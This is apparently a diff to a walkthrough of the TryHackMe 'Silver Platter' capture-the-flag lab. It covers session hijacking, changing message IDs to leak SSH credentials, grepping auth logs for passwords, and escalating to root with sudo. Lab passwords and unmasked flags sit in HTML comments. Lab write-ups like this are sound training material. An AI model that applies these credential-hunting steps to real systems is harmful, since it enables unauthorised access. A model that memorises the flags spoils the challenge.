@@ -1,4 +1,4 @@
-# <div align="center">Silver Platter</div>
+![image](https://github.com/user-attachments/assets/c36dbb68-45da-4b55-881e-2d7773a323bc)# <div align="center">Silver Platter</div>
 <div align="center">Can you breach the server?</div>
 <div align="center">
   <img src="https://github.com/user-attachments/assets/5d49e885-e0d8-4058-a8ea-eb23b7bf8b2a" height="200"></img>
@@ -394,3 +394,164 @@ Again Follow the Redirection
 
 ![image](https://github.com/user-attachments/assets/2d3854fd-999e-4b3b-86f8-151fd0844938)
 
+It hit to 200
+
+![image](https://github.com/user-attachments/assets/d891681b-1638-47e5-bc74-5dfd4ba404c5)
+
+Reqest that session in browser and here we go
+
+![image](https://github.com/user-attachments/assets/89b4cca4-5fe2-41d2-849e-3284d3f5ccba)
+
+There so as i go thorugh the website i found there are 2 more user admin and manager and there is an unread message form manager let take a look at notification
+
+![image](https://github.com/user-attachments/assets/45b127f1-bf61-4a1c-b76f-79e821852ba3)
+
+Let copy the URL and past it on browser
+
+![image](https://github.com/user-attachments/assets/fd635ccb-497d-4561-b5c2-0866923a8472)
+
+There is an id let try to change id  maybe we get somthing more 
+
+When i go through form 0-6 i found other message as well but at 6 we got ssh user:password 
+
+![image](https://github.com/user-attachments/assets/5b9595a5-f09e-4996-bdeb-b0f043f81bc5)
+
+<!-- 
+Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
+
+Username: tim
+
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+-->
+##  Initial access
+
+
+Let logged in using ssh
+```
+death@esther:~$ ssh tim@10.10.12.168
+The authenticity of host '10.10.12.168 (10.10.12.168)' can't be established.
+ED25519 key fingerprint is SHA256:WFcHcO+oxUb2E/NaonaHAgqSK3bp9FP8hsg5z2pkhuE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.12.168' (ED25519) to the list of known hosts.
+tim@10.10.12.168's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Mar  2 02:43:52 PM UTC 2025
+
+  System load:  0.02978515625     Processes:                131
+  Usage of /:   89.9% of 8.33GB   Users logged in:          0
+  Memory usage: 57%               IPv4 address for docker0: 172.17.0.1
+  Swap usage:   0%                IPv4 address for ens5:    10.10.12.168
+
+  => / is using 89.9% of 8.33GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+39 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
+tim@silver-platter:~$
+tim@silver-platter:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+```
+
+User Flag.txt
+<!--
+THM{c4ca4238a0b923820dcc509a6f75849b}
+-->
+```
+tim@silver-platter:~$ cat user.txt 
+THM{c4c***************************b}
+tim@silver-platter:~$ 
+```
+
+There are 2 home directories that mean 2 users
+```
+tim@silver-platter:~$ ls /home/
+tim  tyler
+tim@silver-platter:~$ cd /home/tyler/
+-bash: cd: /home/tyler/: Permission denied
+tim@silver-platter:~$
+```
+We dont have permission to check for user ```tyler```
+Let see can we run any commands as suda
+```
+tim@silver-platter:~$ sudo -l
+[sudo] password for tim: 
+Sorry, user tim may not run sudo on silver-platter.
+tim@silver-platter:~$ 
+```
+Our tim is not a sudore user
+
+## Privesc
+
+Let check for authentication logs
+```
+cat /var/log/auth* | grep -a -i pass
+```
+We got the pass
+
+![image](https://github.com/user-attachments/assets/26ae0276-9d51-427d-8220-e5a0c77d05ce)
+
+<!-- 
+pass: _Zd_zx7N823/
+-->
+
+We got the root, 
+```
+tim@silver-platter:~$ su tyler
+Password: 
+tyler@silver-platter:/home/tim$ 
+```
+We can directly switch to root with tyler password
+```
+tyler@silver-platter:/home/tim$ sudo -l
+Matching Defaults entries for tyler on silver-platter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on silver-platter:
+    (ALL : ALL) ALL
+tyler@silver-platter:/home/tim$ sudo su
+[sudo] password for tyler: 
+root@silver-platter:/home/tim# 
+```
+Root Flag.txt
+
+```
+root@silver-platter:/home/tim# cat /root/root.txt 
+THM{0**************************6}
+root@silver-platter:/home/tim#
+```
+<!--
+THM{098f6bcd4621d373cade4e832627b4f6}
+-->
